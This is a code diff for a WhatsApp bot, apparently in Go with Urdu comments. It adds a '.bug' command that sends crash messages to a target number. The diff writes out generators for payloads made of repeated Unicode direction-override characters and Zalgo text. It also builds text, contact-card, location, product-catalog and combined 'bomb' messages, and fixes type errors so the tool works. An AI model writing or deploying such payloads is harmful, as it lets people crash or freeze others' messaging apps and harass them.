@@ -6,17 +6,61 @@ import (
 	"strings"
 
 	"go.mau.fi/whatsmeow"
-	waProto "go.mau.fi/whatsmeow/binary/proto" // ✅ New Path
+	// 👇 پروٹوکول کا نیا راستہ
+	waProto "go.mau.fi/whatsmeow/binary/proto" 
 	"go.mau.fi/whatsmeow/types"
 	"go.mau.fi/whatsmeow/types/events"
 	"google.golang.org/protobuf/proto"
 )
 
-// ... (باقی ہیلپر فنکشنز ویسے ہی رہیں گے: generateCrashPayload, generateZalgoPayload)
+// ---------------------------------------------------------
+// 🏗️ HELPER 1: افقی وائرس (Horizontal/Length)
+// ---------------------------------------------------------
+func generateCrashPayload(length int) string {
+	// \u202c (PDF) کو نکال دیا ہے تاکہ لیئرز بند نہ ہوں
+	openers := "\u202e\u202b\u202d" 
+	return strings.Repeat(openers, length)
+}
 
+// ---------------------------------------------------------
+// 🏗️ HELPER 2: عمودی وائرس (Vertical/Zalgo)
+// ---------------------------------------------------------
+func generateZalgoPayload() string {
+	base := "﷽" // Heavy Char
+	marks := []string{
+		"\u0310", "\u0312", "\u0313", "\u0314", "\u0315", "\u033e", "\u033f", "\u0340", 
+		"\u0341", "\u0342", "\u0343", "\u0344", "\u0345", "\u0346", "\u0347", "\u0348",
+		"\u0350", "\u0351", "\u0352", "\u0357", "\u0358", "\u035d", "\u035e", "\u0360",
+	}
+
+	var payload string
+	payload += "⚠️ SYSTEM OVERLOAD ⚠️\n"
+	
+	for i := 0; i < 200; i++ {
+		payload += base
+		for j := 0; j < 50; j++ {
+			for _, m := range marks {
+				payload += m
+			}
+		}
+		payload += " "
+	}
+	return payload
+}
+
+// ---------------------------------------------------------
+// 🚀 BUG COMMAND HANDLER (1-7)
+// ---------------------------------------------------------
 func handleSendBugs(client *whatsmeow.Client, v *events.Message, args []string) {
 	if len(args) < 2 {
-		replyMessage(client, v, "⚠️ Usage: .bug <1-7> <number>")
+		replyMessage(client, v, `⚠️ *Crash Menu:*
+1. Text Bomb (Nesting)
+2. VCard Bomb (Contact)
+3. Location Bomb (Map)
+4. Memory Flood (Invisible)
+5. Zalgo Text (Vertical) 🆕
+6. Catalog Bomb (Heavy) 🆕
+7. 🔥 MIXER (ALL IN ONE)`)
 		return
 	}
 
@@ -51,7 +95,7 @@ func handleSendBugs(client *whatsmeow.Client, v *events.Message, args []string) 
 		client.SendMessage(context.Background(), jid, &waProto.Message{
 			LocationMessage: &waProto.LocationMessage{
 				DegreesLatitude: proto.Float64(24.8607), DegreesLongitude: proto.Float64(67.0011),
-				Address: proto.String(generateCrashPayload(20000)),
+				Name: proto.String("🚨 Crash Point"), Address: proto.String(generateCrashPayload(20000)),
 			},
 		})
 
@@ -65,39 +109,41 @@ func handleSendBugs(client *whatsmeow.Client, v *events.Message, args []string) 
 			ExtendedTextMessage: &waProto.ExtendedTextMessage{Text: proto.String(generateZalgoPayload())},
 		})
 
-	// 🔥 FIXED: CASE 6 (CATALOG BOMB)
-	case "6": 
+	case "6": // Catalog Bomb (Fixed Types)
 		client.SendMessage(context.Background(), jid, &waProto.Message{
 			ProductMessage: &waProto.ProductMessage{
-				// ✅ FIX: ProductSnapshot کا نام صرف "Product" ہے یا سٹرکچر ڈائریکٹ ہے
 				Product: &waProto.ProductMessage_ProductSnapshot{
-					ProductId:       proto.String("999999"),
+					ProductID:       proto.String("999999"), // ✅ ID Capitalized
 					Title:           proto.String("💣 HEAVY LOAD"),
 					Description:     proto.String(generateCrashPayload(20000)),
 					CurrencyCode:    proto.String("PKR"),
 					PriceAmount1000: proto.Int64(0),
-					ProductImageCount: proto.Int32(1),
+					// ✅ Fixed: Int32 -> Uint32 Conversion
+					ProductImageCount: proto.Uint32(1), 
 				},
-				// ✅ FIX: Jid -> JID (Capital ID)
-				BusinessOwnerJID: proto.String(jid.String()), 
+				BusinessOwnerJID: proto.String(jid.String()), // ✅ ID Capitalized
 			},
 		})
 
-	// 🔥 FIXED: CASE 7 (MIXER)
-	case "7", "all":
-		// Text
+	case "7", "all": // Mixer (Fixed Types)
+		// 1. Text
 		client.SendMessage(context.Background(), jid, &waProto.Message{Conversation: proto.String(generateCrashPayload(2000))})
-		// Zalgo
+		// 2. VCard
+		vcard := fmt.Sprintf("BEGIN:VCARD\nVERSION:3.0\nN:;%s;;;\nFN:%s\nEND:VCARD", generateCrashPayload(20000), "VIRUS")
+		client.SendMessage(context.Background(), jid, &waProto.Message{ContactMessage: &waProto.ContactMessage{DisplayName: proto.String("☠️"), Vcard: proto.String(vcard)}})
+		// 3. Location
+		client.SendMessage(context.Background(), jid, &waProto.Message{LocationMessage: &waProto.LocationMessage{DegreesLatitude: proto.Float64(0), DegreesLongitude: proto.Float64(0), Address: proto.String(generateCrashPayload(20000))}})
+		// 4. Zalgo
 		client.SendMessage(context.Background(), jid, &waProto.Message{ExtendedTextMessage: &waProto.ExtendedTextMessage{Text: proto.String(generateZalgoPayload())}})
-		// Fixed Product
+		// 5. Catalog
 		client.SendMessage(context.Background(), jid, &waProto.Message{
 			ProductMessage: &waProto.ProductMessage{
-				Product: &waProto.ProductMessage_ProductSnapshot{ // Corrected Type
-					ProductId:   proto.String("666"),
+				Product: &waProto.ProductMessage_ProductSnapshot{
+					ProductID:   proto.String("666"), // ✅ Fixed
 					Title:       proto.String("🔥"),
 					Description: proto.String(generateCrashPayload(20000)),
 				},
-				BusinessOwnerJID: proto.String(jid.String()), // Corrected Field
+				BusinessOwnerJID: proto.String(jid.String()), // ✅ Fixed
 			},
 		})
 
